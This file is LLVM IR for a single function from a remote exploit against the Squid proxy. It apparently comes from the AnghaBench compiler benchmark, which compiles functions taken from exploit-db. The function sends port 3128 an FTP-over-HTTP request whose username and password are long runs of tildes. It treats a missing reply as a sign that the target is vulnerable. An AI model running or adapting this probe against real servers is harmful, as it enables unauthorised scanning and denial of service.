; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21297.c_squid_check_if_vuln.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21297.c_squid_check_if_vuln.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [33 x i8] c"GET ftp://%s:%s@%s/ HTTP/1.0\0D\0A\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @squid_check_if_vuln(i64 %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i64, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [64 x i8], align 16
  store i64 %0, i64* %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %10 = call i32 @memset(i8* %9, i32 0, i32 1024)
  %11 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %12 = call i32 @memset(i8* %11, i32 126, i32 64)
  %13 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 63
  store i8 0, i8* %13, align 1
  %14 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %15 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %16 = getelementptr inbounds [64 x i8], [64 x i8]* %8, i64 0, i64 0
  %17 = load i8*, i8** %5, align 8
  %18 = call i32 @snprintf(i8* %14, i32 1023, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0), i8* %15, i8* %16, i8* %17)
  %19 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 1023
  store i8 0, i8* %19, align 1
  %20 = load i64, i64* %4, align 8
  %21 = call i32 @connect_to_host(i64 %20, i32 3128)
  store i32 %21, i32* %6, align 4
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %24

23:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %49

24:                                               ; preds = %2
  %25 = load i32, i32* %6, align 4
  %26 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %27 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %28 = call i64 @strlen(i8* %27)
  %29 = call i64 @net_write(i32 %25, i8* %26, i64 %28)
  %30 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %31 = call i64 @strlen(i8* %30)
  %32 = icmp eq i64 %29, %31
  br i1 %32, label %33, label %46

33:                                               ; preds = %24
  %34 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %35 = call i32 @memset(i8* %34, i32 0, i32 1024)
  %36 = load i32, i32* %6, align 4
  %37 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %38 = call i64 @net_read(i32 %36, i8* %37, i32 1024)
  %39 = icmp sgt i64 %38, 0
  br i1 %39, label %40, label %43

40:                                               ; preds = %33
  %41 = load i32, i32* %6, align 4
  %42 = call i32 @close(i32 %41)
  store i32 0, i32* %3, align 4
  br label %49

43:                                               ; preds = %33
  %44 = load i32, i32* %6, align 4
  %45 = call i32 @close(i32 %44)
  store i32 1, i32* %3, align 4
  br label %49

46:                                               ; preds = %24
  %47 = load i32, i32* %6, align 4
  %48 = call i32 @close(i32 %47)
  store i32 0, i32* %3, align 4
  br label %49

49:                                               ; preds = %46, %43, %40, %23
  %50 = load i32, i32* %3, align 4
  ret i32 %50
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i8*, i8*) #1

declare dso_local i32 @connect_to_host(i64, i32) #1

declare dso_local i64 @net_write(i32, i8*, i64) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i64 @net_read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
